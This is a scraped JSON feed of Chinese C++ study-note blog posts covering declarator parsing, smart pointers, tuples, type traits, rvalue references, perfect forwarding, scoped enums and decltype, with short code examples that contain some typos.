声明子是n，这是一个只包含direct-declarator的declarator-id，因此根据含义，n的类型为整型。如果声明子为其它形式，那么你可以按照下面的方法确定标识符的类型：首先，假设T为decl-specifiers隐含的类型，忽略friend或static等非类型属性，同时假设D为声明子。然后重复下面的步骤直到推导出D为一个declarator-id，此时T正是你所寻找的类型： 如果D形如(D1)，那么用D1替换D。 如果D形如 D1 或 const D1，那么根据是否有const，用“指针，它指向T”或者“常量指针，它指向T”替换T，然后用D1替换D。 如果D形如D1(参数-声明-列表)，那么用参数由参数-声明-列表定义的、“返回T的函数”替换T，然后用D1替换D。 如果D形如D1[常量-表达式]，那么用元素个数由常量-表达式给出的“T数组”替换T，然后然后用D1替换D。 最后，如果声明子形如&amp;D，那么用“T引用”替换T，然后用D1替换D。作为一个示例，考虑下面的声明 1int *f(); 首先，T和D分别为int和f()，因此D形如D1，其中D1为f()。你可能认为D可以形如D1() 或者 D1。然而，如果D形如D1()，那么D1将不得不为f，D1将是一个direct-declarator（因为本节开始处的语法注1规定只有direct-declarator前面是()）。但是如果我们看看direct-declarator的定义注2，很明显它不能包含。因此，D只能是f()，它形如*D1，其中D为f()。既然我们已经确定D1为f()，那么我们知道必须用“指针，它指向T”替换T，即“指针，指向整型”，同时用f()替换D。至此我们还没有解析D为declarator-id，因此我们必须重复该过程。此时，D1只能是f，因此我们用“返回T的函数”替换T，它是一个“返回整型指针不带参数的函数”，然后用f替换D。此时，D为declarator-id，因此推导结束。我们已经确定声明 1int *f(); 声明f的类型为“不带参数返回整型指针的函数”。另一个例子，声明 1int* p, q; 具有两个声明子，p和q。对于每个声明子，T都是int。对于第一个声明子，D是p，因此T变成“指针，它指向整型，”而D为p。声明p类型为“指针，它指向整型”。我们单独分析第二个声明子，T还是int，D是q。很明显声明q为整型。最后，让我们分析§10.1.2/173中那个奇怪的例子: 1double (*get_analysis_ptr())(const vector&lt;Student_info&gt;&amp;); 分析过程可以分为下面五个步骤 T: double D: (*get_analysis_ptr())(const vector&lt;Student_info&gt;&amp;) T: 返回double带有 const vector&lt;Student_info&gt;&amp; 参数的函数 D: (*get_analysis_ptr()) T: function returning double… (如前所示) D: *get_analysis_ptr() T: 指针，它指向一个返回double…的函数 D: get_analysis_ptr() T: 一个函数，返回一个函数指针，它指向一个返回double…的函数 D: get_analysis_ptrget_analysis_ptr是一个函数，它返回一个函数指针，它指向一个返回double，带有const vector&lt;Student_info&gt;&amp;参数的函数。我们将如何展开const vector&lt;Student_info&gt;&amp;作为一个练习。幸运的是，很少有函数声明如此令人迷惑；它们中的大多数看起来 1declarator: declarator-id ( parameter-declaration-list ) 到目前为止，常见情况中最难的是返回函数指针的函数。注1：这里将allows翻译为规定而不是允许。因为如果翻译为允许，言外之意是()后面还可以是其它东西，但是在五条语法中找不到这种东西。语法指的是direct-declarator ( parameter-declaration-list )注2：“declarator: [ * [ const ] | &amp; ]… direct-declarator”","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"}]},{"title":"cpp通用工具(2)","slug":"2017-04-17-cpp通用工具2","date":"2017-04-16T16:00:00.000Z","updated":"2018-02-18T03:29:06.205Z","comments":true,"path":"2017/04/17/2017-04-17-cpp通用工具2/","link":"","permalink":"http://coordinate.wang/2017/04/17/2017-04-17-cpp通用工具2/","excerpt":"","text":"Class unique_ptr可确保一个对象和其相应资源同一时间之辈一个pointer占有。unique_ptr是“其所指对象”的唯一拥有者。当unique_ptr被销毁，其所指的对象也就自动销毁。unique_ptr的必要条件是，他指的对象只有一个拥有者。 12345#include&lt;memory&gt;void f()&#123; std::unqiue_ptr&lt;ClassA&gt; ptr(new ClassA);&#125; 这样就够了，不需要delete语句和catch语句。如果是普通的指针的话，会出现这样的问题，可能会忘记delete对象，特别是如果你在函数中有个return语句。 使用unique_ptr12345//create and initialize stringstd::unique_ptr&lt;std::string&gt; up(new std::string(\"nico\");(*up)[0] = 'N';//replace first characterup-&gt;append(\"fjdk\");//append some charactersstd::cout &lt;&lt; *up &lt;&lt; std::endl; 此外你可以调用release,获得unique_ptr拥有的对象并放弃拥有权，于是调用者对该对象有了使用权： 12std::unique_ptr&lt;std::string&gt; up(new std::string(\"nico\");std::string* sp = up.release(); 转移unique_ptr的拥有权不可以对unique_ptr执行copy和assign，如果你要的是寻常的copy语句。然而你可以使用move。这种情况下上述的copy构造函数或assignment操作符拥有权交给另一个unique_ptr。举个例子: 1234std::unique_ptr&lt;ClassA&gt; up1(new ClassA);std::unique_ptr&lt;ClassA&gt; up2(up1);//ERROR//transfer ownership of the unique_ptrstd::unique_ptr&lt;ClassA&gt; up3(std::move(up1));//OK assignment操作符的行为和上面所说的类似: 1234std::unique_ptr&lt;ClassA&gt; up1(new ClassA);std::unique_ptr&lt;ClassA&gt; up2;up2 = up1;//ERROR up2 = std::move(up1);//assign the unique_ptr 如果上述的复制动作之前up2原本拥有对象，会有一个delete动作被调用。删除该对象： 1234std::unique_ptr&lt;ClassA&gt; up1(new ClassA);std::unique_ptr&lt;ClassA&gt; up2(new ClassA);up2 = std::move(up1);//assign the unique_ptr//delete object owned by up2 对于array对于array应该是用delete[]而不是delete，所以下面的做法是错误的： 1std::unique_ptr&lt;std::string&gt; up(new std::string[10]); 很幸运，C++标准可提供了一个派诺特话版本用来处理array，对该对象调用delete[]。你只要这样申明： 1std::unique_ptr&lt;std::string[]&gt; up(new std::string[10]); 然而要注意的是，他不提供操作符*和-&gt;，提供[]，用于访问其所执行的array中的某个对象： 123std::unique_ptr&lt;std::string[]&gt; up(new std::string[10]);std::cout &lt;&lt; *up &lt;&lt; std::endl;//ERRORstd::cout &lt;&lt; up[0] &lt;&lt; std::endl;//OK 其他相应资源的deleter当你所指向的对象要求的不只是delete或delete[]，你就只好自己制定deleter。但是与shared_ptr不同的是，你必须指定deleter的类型作为第二个template实参。该类型可以是reference to function，或是个function pointer或function object。如果是function object的话，其function call操作符()应该接受一个“指向对象”的pointer。 123456789class ClassADeleter&#123;public: void operator() (ClassA* p) &#123; delete p; &#125;&#125;;std::unique_ptr&lt;ClassA,ClassADeleter&gt; up(new ClassA()); 如果你给的是个函数或lambda，你必须声明deleter的类型位void()(T)或std::function&lt;void(T*)&gt;，要不就是使用decltype 123456789101112131415161718std::unique_ptr&lt;int,void(*)(int*)&gt; up(new int[10], [](int* p) &#123; ... delete [] p; &#125;);std::unique_ptr&lt;int,std::function&lt;void(int*)&gt; up(new int[10], [](int* p) &#123; ... delete [] p; &#125;);auto l = [](int *p) &#123; ... delete [] p; &#125;);std::unique_ptr&lt;int,decltype(l)&gt; up(new int[10],l); Type Trait 和Type UtilityType trait 的目的所谓的type trait，提供一种用来处理type属性的办法。他是个template，可以在编译期根据一个或多个template实参产生一个type或value。 123456789101112template&lt;typename T&gt;void foo(const T&amp; val)&#123; if(std::ispointer&lt;T&gt;::value) &#123; std::cout &lt;&lt; \"foo() called for a pointer \" &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; \"foo() called for a value \" &lt;&lt; std::endl; &#125;&#125; 针对整数类型的重载 123456789template&lt;typename T&gt;void foo_impl(T val,true_type);template&lt;typename T&gt;void foo_impl(T val, false_type);template&lt;typename T&gt;void foo(T val)&#123; foo_impl(val, std::is_integral&lt;T&gt;());&#125; 细究Type TraitType trait定义于&lt;type_traits&gt; (unary) Type PredicateTrait中的大部分都是unary，也就是说他们使用一个template实参。例如is_const&lt;&gt;，它用来检查传入的类型是否为const： 1234is_const&lt;int&gt;::value //falseis_const&lt;const volatile int&gt; ::value //trueis_const&lt;int* const&gt;::value //trueis_const&lt;const int*&gt;;:value //false 用于检验type relation的trait 1is_assignable&lt;T,T2&gt; //可以将类型T2复制给类型T is_assignable&lt;&gt;的第一个类型若是nonclass，永远获得false_type。但是对于class，ordinary type作为第一类型是可以的例如： 12345is_assignable&lt;int,int&gt;::value //falseis_assignable&lt;int&amp;，void*&gt;::value //falseis_assignable&lt;void*,int&amp;&gt;::value //falseis_assignable&lt;int&amp;,int&gt;::value //trueis_constructible&lt;T,Args...&gt; //可以运用类型Args初始化T 例如： 12is_constructiable&lt;int&gt;::value //trueis_constructiable&lt;int, int&gt;::value //true Type Modifier所有这一类trait为类型添加一个属性，前提是该属性尚未存在，或移除一个属性，前提是这个属性已经存在。例如： 123typedef int T;add_const&lt;T&gt;::type //const intremove_const&lt;T&gt;::type //int 而类型const int&amp;可被降级或扩展 1234typedef const int&amp; T;add_rvalue_reference&lt;T&gt;::type //const int&amp;remoce_const&lt;T&gt;::type //const int&amp;remoce_reference&lt;T&gt;::type //const int 要注意的是，一个“指向某常量类型”的reference本身并不是常量。add_lvalue_reference&lt;&gt;把一个rvalue reference转换为一个lvalue reference,然而add_rvalue_reference并不会把lvalue reference转化为rvalue reference。必须使用下面的做法： 1add_rvalue_reference&lt;remove_reference&lt;T&gt;::type&gt;::type Function Type Wrapper使用member function时，“借以调用他们”的那个对象必须被当作第一参数： 12345678class C&#123;public: void memfunc(int x, int y) const;&#125;;std::function&lt;void (const C&amp;,int,int)&gt; mf;mf = &amp;C::memfunc;mf(C(), 42,77);","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"cpp通用工具(1)","slug":"2017-04-16-cpp通用工具1","date":"2017-04-15T16:00:00.000Z","updated":"2018-02-18T03:29:06.200Z","comments":true,"path":"2017/04/16/2017-04-16-cpp通用工具1/","link":"","permalink":"http://coordinate.wang/2017/04/16/2017-04-16-cpp通用工具1/","excerpt":"","text":"Pair 构造函数与赋值自C++11开始，如果pair&lt;&gt;用到了某个类型而该类型只有一个nonconstant copy构造函数，将会编译失败： 1234567class A&#123; public: ... A(A&amp;);&#125;std::pair&lt;A,int&gt; p;//ERROR since C++11 piecewise construction12345678910111213class Foo&#123;public: Foo(tuple&lt;int,float&gt;)&#123;&#125; template&lt;typename.. Args&gt; Foo(Args... args)&#123;&#125;&#125;;int mian()&#123; tuple&lt;int,float&gt; t(1,2.22); pair&lt;int,Foo) p1(42,t); pair&lt;int,Foo&gt; p2(piecewise_construct, make_tuple(42),t);&#125; 只有当std::poecewise_construct被当作第一参数，class Foo才会被迫使用那个“接受tuple的元素而非tuple整体”的构造函数。这就意味着，在这个例子中被调用的是那个“实参数目不定的构造函数”。 make_pair自C++11开始，可以使用内的tie()接口，抽取出pair的value： 123std::pair&lt;char,char&gt; p = std::make_pair('x','y');char c;std::tie(sstd::ignore,c) = p;//extra seconf value into c c++standard明确指出，如果可能的话make_pair()使用move语义，否则就使用copy语义 TupleTuple的操作12345678910111213//create four-element tuple elements are initialized with default valuetuple &lt;string,int,int,complex&lt;double&gt;&gt; t;//create and initialize a tuple explicitlytuple &lt;int,float,string&gt; t1(41,6.3,\"nico\");//create tuple with make_tupleauto t2 = make_tuple(22,33,\"nico\");//assignmentget&lt;1&gt;(t1) = get&lt;1&gt;(t2);//cpmparsionif(t1 &lt; t2)&#123; t1 = t2;&#125; 运行期传入一个索引是不允许的 12int i;get&lt;i&gt;(t1);//ERROR tie如果想最方便的在tuple中使用reference，可以使用tie，他可以建立一个内含reference的tuple： 1234std::tuple&lt;int float,std::string&gt; t(77,1.1,\"move lisght\");int i;float f;std::string s;std::tie(i,f,s) = t;//assigns values of t to I,fand s 这里std::tie会将i、f和s的reference建立起一个tuple。等同于: 1std::make_tuple(std::ref(i),std::ref(f),std::ref(s)) = t; 使用tie的时候，std::ignore允许我们忽略tuple的某些元素，也就是我们可以用它来局部提取tuple的元素值： 1234std::tuple&lt;int float,std::string&gt; t(77,1.1,\"move lisght\");int i;std::string s;std::tie(i,std::ignore,s) = t;//assign first and third value of t to I and s Initializer List不可以将初值列传至“期望获得一个tuple”的地方 12std::vector&lt;std::tuple&lt;int,float&gt;&gt; v&#123;1,1.0&#125;;ERRORstd::tuple&lt;int,int,int&gt; foo()&#123;return &#123;1,2,3&#125;;&#125;//ERROR 注意的是，上面的做法对于pair和array是可以的但是对于tuple，你必须明确的将初值转为一个tuple 123456std::vector&lt;std::tuple&lt;int,float&gt;&gt; v&#123;std::make_tuple(1,1.0), std::make_tuple(2,2.0)&#125;;//OKstd::tuple&lt;int,int,int&gt; foo()&#123; return std::make_tuple(1,2,3);//OK&#125; 其他的tuple特性tuple_size::value可获得元素个数tuple_element&lt;idx,tupletype&gt;::type可获得idx个元素的类型tuple_cat()可将多个tuple创成一个tupletuple的输入输出tuple class 出公开于boost程序库，在那里tuple可以将元素写至ouput stream，但是C++标准库不支持。你可以使用一下头文件做支持： 12345678910111213141516171819202122232425//printtuple.hpp#include&lt;tuple&gt;#include &lt;iostream&gt;template&lt;int IDX,int MAX, typename... Args&gt;struct PRINT_TUPLE&#123; static void print(std::ostream&amp; strm,const std::tuple&lt;Args...&gt;&amp; t) &#123; strm &lt;&lt; std::get&lt;IDX&gt;(t) &lt;&lt; (IDX + 1==MAX?\"\":\",\"); PRINT_TUPLE&lt;IDX+1, MAX, Args...&gt;::print(strm, t); &#125;&#125;template&lt;typename... Args&gt;ostream&amp; operator&lt;&lt;(ostream&amp; strm, const tuple&lt;Args...&gt;&amp; t)&#123; strm &lt;&lt; \"[\"; PRINT_TUPLE&lt;0,sizeof...(Args),Args...&gt;::print(strm,t); return strm &lt;&lt; \"]\";&#125;template&lt;int MAX, typename...Args&gt;struct PRINT_TUPLE&lt;MAX, MAX, Args...&gt;&#123; static void print (std::ostream&amp; strm, const tuple&lt;Args...&gt;&amp; t) &#123;&#125;&#125;; 这文件在cpp2.0新特性第二讲中有提及 Class shared_ptr多个shared_ptr可以共享同一个对象。对象的最后一个拥有着有责任销毁对象，并清除与该对象相关的所有资源。 使用shared_ptr123#include &lt;memory&gt;shared_ptr&lt;string&gt; pNic(new string(\"nic\"));shared_ptr&lt;string&gt; pJut(new string(\"jut\")); 由于“接受单一pointer作为唯一实参”的构造函数是explicit，所以这里不可以使用assign，那要被视为需要一个隐式转换。 1234shared_ptr&lt;string&gt; pNic = new string(\"nic\");//ERRORshared_ptr&lt;string&gt; pNic;pNic.reset(new string(“nico”));//OKshared_ptr&lt;string&gt; pJut &#123;new string(\"jut\")&#125;;//OK 也可以使用make_shared 12shared_ptr&lt;string&gt; pNic = make_shared&lt;string&gt;(“nic”);shared_ptr&lt;string&gt; pJut = make_shared&lt;string&gt;(“jut”); 这样做会比较安全 对于array可以使用unique_ptr的辅助函数作为deleter，其内部调用delete[]: 12std::shared_ptr&lt;int&gt; p(new int[10], std::default_delete&lt;int[]&gt;()); 然而要注意的是，shared_ptr和unique_ptr以不同的方式处理deleter。例如unique_ptr允许你只传递对应元素类型作为template实参，对于shared_ptr就不可以： 12std::unique_ptr&lt;int[]&gt; p(new int[10]);//OKstd::shared_ptr&lt;int[]&gt; p(new int[10]);//ERROR 此外对于unique_ptr，必须明确给第二个template实参，指出自己的deleter： 12std::unique_ptr&lt;int,void(*)(int*)&gt; p(new int[10], [](int *p)&#123; delete []p;&#125;); 还要注意的是shared_ptr不提供operator[]，但是unique_ptr可以。 Class weak_ptr允许使用“共享但不拥有”的对象，这个class 会建立起一个shared_ptr。一旦最末尾一个拥有该对象的shared_ptr失去拥有全，任何weak_ptr都会自动成空。 使用 weak_ptr12345678910111213141516171819202122232425262728293031323334353637383940class Person &#123; public: string name; shared_ptr&lt;Person&gt; mother; shared_ptr&lt;Person&gt; father; vector&lt;shared_ptr&lt;Person&gt;&gt; kids; Person (const string&amp; n, shared_ptr&lt;Person&gt; m = nullptr, shared_ptr&lt;Person&gt; f = nullptr) : name(n), mother(m), father(f) &#123; &#125; ~Person() &#123; cout &lt;&lt; \"delete \" &lt;&lt; name &lt;&lt; endl; &#125;&#125;;shared_ptr&lt;Person&gt; initFamily (const string&amp; name)&#123; shared_ptr&lt;Person&gt; mom(new Person(name+\"'s mom\")); shared_ptr&lt;Person&gt; dad(new Person(name+\"'s dad\")); shared_ptr&lt;Person&gt; kid(new Person(name,mom,dad)); mom-&gt;kids.push_back(kid); dad-&gt;kids.push_back(kid); return kid;&#125;int main()&#123; shared_ptr&lt;Person&gt; p = initFamily(\"nico\"); cout &lt;&lt; \"nico's family exists\" &lt;&lt; endl; cout &lt;&lt; \"- nico is shared \" &lt;&lt; p.use_count() &lt;&lt; \" times\" &lt;&lt; endl; cout &lt;&lt; \"- name of 1st kid of nico's mom: \" &lt;&lt; p-&gt;mother-&gt;kids[0]-&gt;name &lt;&lt; endl; p = initFamily(\"jim\"); cout &lt;&lt; \"jim's family exists\" &lt;&lt; endl;&#125; 每个person的析构函数都未被调用 1234567891011121314151617class Person &#123; public: string name; shared_ptr&lt;Person&gt; mother; shared_ptr&lt;Person&gt; father; vector&lt;weak_ptr&lt;Person&gt;&gt; kids; // weak pointer !!! Person (const string&amp; n, shared_ptr&lt;Person&gt; m = nullptr, shared_ptr&lt;Person&gt; f = nullptr) : name(n), mother(m), father(f) &#123; &#125; ~Person() &#123; cout &lt;&lt; \"delete \" &lt;&lt; name &lt;&lt; endl; &#125;&#125;; 这样做后。我们可以打破shared pointer形成的cycle，使得从kid到parent用的时shared pointer，而parent到kids使用的weak pointer。注意使用weak pointer时，我们必须用一下方式访问对象。不应该这样： 1p-&gt;mother-&gt;kids[0]-&gt;name 必须是这样在式子内加上lock： 1p-&gt;mother-&gt;kids[0].lock()-&gt;name 错误的使用shared pointershared_ptr多次引用同一数据，如下： 1234int* pInt = new int[100];shared_ptr&lt;int&gt; sp1(pInt);// 一些其它代码之后…shared_ptr&lt;int&gt; sp2(pInt); 这种情况在实际中是很容易发生的，结果也是非常致命的，它会导致两次释放同一块内存，而破坏堆。使用shared_ptr包装this指针带来的问题，如下： 1234567891011121314151617181920class tester &#123;public: tester() ~tester() &#123; std::cout &lt;&lt; \"析构函数被调用!\\n\"; &#125;public: shared_ptr&lt;tester&gt; sget() &#123; return shared_ptr&lt;tester&gt;(this); &#125;&#125;;int main()&#123; tester t; shared_ptr&lt;tester&gt; sp = t.sget(); return 0;&#125; 也将导致两次释放t对象破坏堆栈，一次是出栈时析构，一次就是shared_ptr析构。若有这种需要，可以使用下面代码。 12345678910111213141516171819202122class tester : public std::enable_shared_from_this&lt;tester&gt;&#123;public: tester() ~tester() &#123; std::cout &lt;&lt; \"析构函数被调用!\\n\"; &#125;public: shared_ptr&lt;tester&gt; sget() &#123; return shared_from_this(); &#125;&#125;;int main()&#123; shared_ptr&lt;tester&gt; sp(new tester); // 正确使用sp 指针。 sp-&gt;sget(); return 0;&#125; Class unique_ptr可确保一个对象和其相应资源同一时间之辈一个pointer占有。unique_ptr是“其所指对象”的唯一拥有者。当unique_ptr被销毁，其所指的对象也就自动销毁。unique_ptr的必要条件是，他指的对象只有一个拥有者。 12345#include&lt;memory&gt;void f()&#123; std::unqiue&lt;ClassA&gt; ptr(new ClassA);&#125; 这样就够了，不需要delete语句和catch语句。如果是普通的指针的话，会出现这样的问题，可能会忘记delete对象，特别是如果你在函数中有个return语句。 使用unique_ptr12345//create and initialize stringstd::unique_ptr&lt;std::string&gt; up(new std::string(\"nico\");(*up)[0] = 'N';//replace first characterup-&gt;append(\"fjdk\");//append some charactersstd::cout &lt;&lt; *up &lt;&lt; std::endl; 此外你可以调用release,获得unique_ptr拥有的对象并放弃拥有权，于是调用者对该对象有了使用权： 12std::unique_ptr&lt;std::string&gt; up(new std::string(\"nico\");std::string* sp = up.release(); 转移unique_ptr的拥有权不可以对unique_ptr执行copy和assign，如果你要的是寻常的copy语句。然而你可以使用move。这种情况下上述的copy构造函数或assignment操作符拥有权交给另一个unique_ptr。举个例子: 123456789std::unique_ptr&lt;ClassA&gt; up1(new ClassA);std::unique_ptr&lt;ClassA&gt; up2(up1);//ERROR//transfer ownership of the unique_ptrstd::unique_ptr&lt;ClassA&gt; up3(std::move(up1));//OKassignment操作符的行为和上面所说的类似:std::unique_ptr&lt;ClassA&gt; up1(new ClassA);std::unique_ptr&lt;ClassA&gt; up2;up2 = up1;//ERROR up2 = std::move(up1);//assign the unique_ptr 如果上述的复制动作之前up2原本拥有对象，会有一个delete动作被调用。删除该对象： 1234std::unique_ptr&lt;ClassA&gt; up1(new ClassA);std::unique_ptr&lt;ClassA&gt; up2(new ClassA);up2 = std::move(up1);//assign the unique_ptr//delete object owned by up2 对于array对于array应该是用delete[]而不是delete，所以下面的做法是错误的： 1std::unique_ptr&lt;std::string&gt; up(new std::string[10]); 很幸运，C++标准可提供了一个派诺特话版本用来处理array，对该对象调用delete[]。你只要这样申明： 1std::unique_ptr&lt;std::string[]&gt; up(new std::string[10]); 然而要注意的是，他不提供操作符*和-&gt;，提供[]，用于访问其所执行的array中的某个对象： 123std::unique_ptr&lt;std::string[]&gt; up(new std::string[10]);std::cout &lt;&lt; *up &lt;&lt; std::endl;//ERRORstd::cout &lt;&lt; up[0] &lt;&lt; std::endl;//OK 其他相应资源的deleter当你所指向的对象要求的不只是delete或delete[]，你就只好自己制定deleter。但是与shared_ptr不同的是，你必须指定deleter的类型作为第二个template实参。该类型可以是reference to function，或是个function pointer或function object。如果是function object的话，其function call操作符()应该接受一个“指向对象”的pointer。 123456789class ClassADeleter&#123;public: void operator() (ClassA* p) &#123; delete p; &#125;&#125;;std::unique_ptr&lt;ClassA,ClassADeleter&gt; up(new ClassA()); 如果你给的是个函数或lambda，你必须声明deleter的类型位void()(T)或std::function&lt;void(T*)&gt;，要不就是使用decltype 123456789101112131415161718std::unique_ptr&lt;int,void(*)(int*)&gt; up(new int[10], [](int* p) &#123; ... delete [] p; &#125;);std::unique_ptr&lt;int,std::function&lt;void(int*)&gt; up(new int[10], [](int* p) &#123; ... delete [] p; &#125;);auto l = [](int *p) &#123; ... delete [] p; &#125;);std::unique_ptr&lt;int,decltype(l)&gt; up(new int[10],l);","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"cpp2.0新特性(3)","slug":"2017-04-15-cpp2.0新特性3","date":"2017-04-14T16:00:00.000Z","updated":"2018-02-18T03:29:06.181Z","comments":true,"path":"2017/04/15/2017-04-15-cpp2.0新特性3/","link":"","permalink":"http://coordinate.wang/2017/04/15/2017-04-15-cpp2.0新特性3/","excerpt":"","text":"Rvalue referencesRvalue references are a new reference type introduced in C++0x that help solve the problem of unnecessary copying and enable perfect forwarding.When the right-hand side of an assignment is an rvalue, then the left-hand side object can steal resources from the right-hand side object rather than performing a separate allocation ,thus enabling move semanticsLvalue:可以出现operator=左侧Rvalue:只能出现operator=右侧做以下测试： 1234567string s1(\"hello \");string s2(\"world\");s1 + s2 = s2; //竟然通过了编译string() = \"world\";//竟然可以对temp object赋值cout &lt;&lt; s1 &lt;&lt; endl;cout &lt;&lt; s2 &lt;&lt; endl;cout &lt;&lt; s1 + s2 &lt;&lt; endl; 结果为： 123helloworldhello world 这个是标准库设计上的不合理，temp object是一个RvalueC++ with its user-defined types has introduced some subtleties regarding modifiability and assignability that cause this definition to be incorrect 12345int foo()&#123; return 5; &#125;...int x = foo();int *p = &amp;foo(); //ERROR 表达式必须为左值foo() = 7; //ERROR 表达式必须是可修改的左值 函数的返回值是一个Rvalue，对Rvalue取reference是不可以的 Unperfect Forwarding12345678910111213141516171819202122void process(int&amp; i)&#123; cout &lt;&lt; \"process\" &lt;&lt; i &lt;&lt; endl;&#125;void process(int&amp;&amp; i)&#123; cout &lt;&lt; \"process(int&amp;&amp;):\" &lt;&lt; i &lt;&lt; endl;&#125;void forward(int &amp;&amp;i)&#123; cout &lt;&lt; \"forward(int &amp;&amp;):\" &lt;&lt; i &lt;&lt; endl; process(i);&#125;int a = 0;process(a);//process(int&amp;):0process(1);//process(int&amp;&amp;):1process(move(a));//process(int&amp;&amp;):0forward(2);//forward(int&amp;&amp;):2,process(int&amp;):2//rvalue经过forward()传给另一个函数却变为lvalue//原因在于传递的过程中它变成了一个named objectforward(move(a));//forward(int&amp;&amp;):0,process(int&amp;):0//rvalue经过forward()传给另一个函数却变为rvalue Perfect ForwardingPerfect forwarding allows you to write a single function template that takes n arbitrary arguments and forwards them transparently to another arbitrary function.The nature of the argument(modifiable,const ,lvalue or rvalue) is preserved in this forwarding process. 123456template&lt;typename T1,typename T2&gt;void functionA(T1&amp;&amp; t1, T2&amp;&amp; t2)&#123; functionB(std::forward&lt;T1&gt;(t1), std::forward&lt;T2&gt;(t2));&#125; String LiteralRaw String Literal例如一个用来表示两个反斜杠和一个n的寻常字面常量可定义如下： 1“\\\\\\\\n” 也可以定义为raw string literal 1R”(\\\\n)” 如果要在raw string内写出)”，可以使用定义符。因此，一个raw string的完整语法是R”delim()delim”,其中delim是字符序列，最多16个基本字符，不包含反斜线、空格和小括号。举个例子： 123R”nc(a\\ b\\nc()”)nc” 等同于 1“a\\\\\\n b\\\\nc()\\”\\n ” Encoded String Literalu8定义一个UTF-8编码。u定义一个string lteral，带着char16_t的字符U定义一个string lteral，带着char32_t的字符L定义一个wide string lteral，带着wchar_t的字符 New Fundamental Data Typechar16_t 和 char32_tlong long 和unsigned long longstd::nullptr_t Scoped Enumerration一般情况下，在花括号中声明一个name（包括变量名，函数名），这个name的可见性会被限制在花括号的作用域内。对于在C++98风格的enum中声明的enum成员却不是这样。这些enum成员的name属于的作用域是enum所在作用域，这意味着在这个作用域中，不能拥有相同的name: 1234enum Color &#123; black, white, red &#125;; //black，white，red //和Color在同一个作用域auto white = false; //错误！white在这个 //作用域已经声明过了 所以事实上，这些enum成员name泄露到enum所在的作用域中去了，这导致官方对于这种enum给出了一个官方术语：unscoped。新的C++11中有一个与此相对应的版本：scoped enum，不会像这样让name泄露： 1234567enum class Color &#123; black, white, red &#125;; //black，white red //在Color作用域中auto white = false; //好的，没其他whiteColor c = white; //错误！在这个作用域中没有 //一个叫“white”的enum成员Color c = Color::white; //对的auto c = Color::white; //也是对的（而且和Item 5的建议一样） 再举个例子： 1enum class Salutation : char &#123; mr, ms co&#125;; 你可以明显定义底层类型（本例是char）并因此获得一个保证大小（如果你这里省略了char，则默认是int）。 Member Template Member template的一个特殊形式时template构造函数。这个函数通常被提供用于“对象被复制时给予隐式类型转换”的能力。 123456789101112131415template&lt;typename T&gt;class MyClass &#123;//copy constructor with inmplicit type conversion//-ddoes not supperss implicit copy constructor template&lt;typename U&gt; MyClass ( const MyClass&lt;U&gt;&amp; x); ...&#125;;void f()&#123; MyClass&lt;double&gt; xd; MyClass&lt;double&gt; xd2(xd); MyClass&lt;int&gt; xi(xd);&#125; 这里xd2与xd类型完全相同，因此其初始化是通过被隐式生成的copy构造函数完成。xi的类型与xd不同，因此其初始化是通过template构造函数完成的。 Explicit Initialization for Fundamental Type如果你使用一个明确的构造函数，但不给实参这样的语法，基础类型会被设定初值为0： 1234int i1;//undefined valueint i2 = int();//initialized with zeroint i3&#123;&#125;;//initialized with zerostd::pair&lt;int,float&gt; p;//initialize p.first and p.second with zero","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"cpp第二版","slug":"cpp第二版","permalink":"http://coordinate.wang/tags/cpp第二版/"}]},{"title":"cpp2.0新特性(2)","slug":"2017-04-14-cpp2.0新特性2","date":"2017-04-13T16:00:00.000Z","updated":"2018-02-18T03:29:06.164Z","comments":true,"path":"2017/04/14/2017-04-14-cpp2.0新特性2/","link":"","permalink":"http://coordinate.wang/2017/04/14/2017-04-14-cpp2.0新特性2/","excerpt":"","text":"decltypeDeclval converts any type T to a reference type, making it possible to use member functions in decltype expressions without the need to go through constructors.Decltype allows the compiler to infer the return type of a function based on an arbitrary expression and makes perfect forwarding more generic.In past versions,for two arbitrary T1 and T2,there was no way to deduce the type of an expression used these two types.The decltype feature allows you to state, for example, an expression that has template arguments,such as sum&lt;T1,T2&gt;() has the type T1+T2.By using the new decltype keyword,you can let the complier find out the type of an expression.This is the realization of the often requested typeof feature.However,the existing typeof implementations were inconsistent and incomplete,so C++11 introduced a new keyword.For example: 12map&lt;string,float&gt; coll;decltype(coll)::value_type elem; One application of decltype is to declare return types.Another is to use it in metaprogramming or to pass the type of a lambda. Used to declare return typesSometimes,the return type of a function depends on an expression processed with the arguments.However,something like 12template&lt;typename T1, typename T2&gt;decltype(x+y)add(T1 x,T2 y); was not possible before C++11,because the return expression uses objects not introduced or in scope yet.But with C++11,you can alternatively declare the return type of a function behind the parameter list: 12template&lt;typename T1,typename T2&gt;auto add(T1 x,T2 y)-&gt;decltype(x+y); This uses the same syntax as for lambdas to declare return types. In metaprogramming123456789101112template&lt;typename T&gt;void test_decltype(T obj)&#123; map&lt;string, float&gt;::value_type elem; map&lt;string, float&gt; coll; decltype(coll)::value_type elem2; typedef typename decltype(obj)::iterator iType; //typedef typename T::iterator iType; decltype(obj) anotherObj(obj);&#125; Pass the type of a lambda123456auto cmp =[](const Person&amp; p1,const Person&amp; p2)&#123; return p1.lastname()&lt;p2.lastname()|| (p1.lastname() == p2.lastname()&amp;&amp; p1.lastname() &lt; p2.lastname());&#125;;std::set&lt;Person,decltype(cmp)&gt; coll(cmp); 